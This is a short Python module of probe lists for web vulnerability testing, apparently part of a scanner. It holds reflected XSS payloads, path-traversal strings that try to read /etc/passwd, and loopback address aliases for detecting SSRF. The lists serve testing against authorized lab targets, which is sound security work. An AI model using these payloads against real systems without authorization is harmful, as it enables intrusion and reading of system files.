"""
Payload libraries for vulnerability tests.

Each list contains probe strings used to detect specific vulnerability classes.
Intended for use only against authorized lab targets.
"""

# Reflective XSS: injected into params, check if payload appears in response body.
XSS_PROBES: list[str] = [
    "<script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    '"><svg/onload=confirm(1)>',
]

# LFI/directory traversal: attempt to read /etc/passwd, look for root:x:0:0 marker.
TRAVERSAL_PROBES: list[str] = [
    "../../../../../../etc/passwd",
    "..%2f" * 10 + "etc/passwd",
    "....//" * 10 + "etc/passwd",
]

# SSRF: internal IP/host aliases to probe for server-side request forgery.
IP_ALIASES: list[str] = [
    "127.0.0.1",
    "localhost",
    "2130706433",  # 127.0.0.1 decimal
    "0x7f000001",  # 127.0.0.1 hex
    "[::1]",  # IPv6 loopback
]
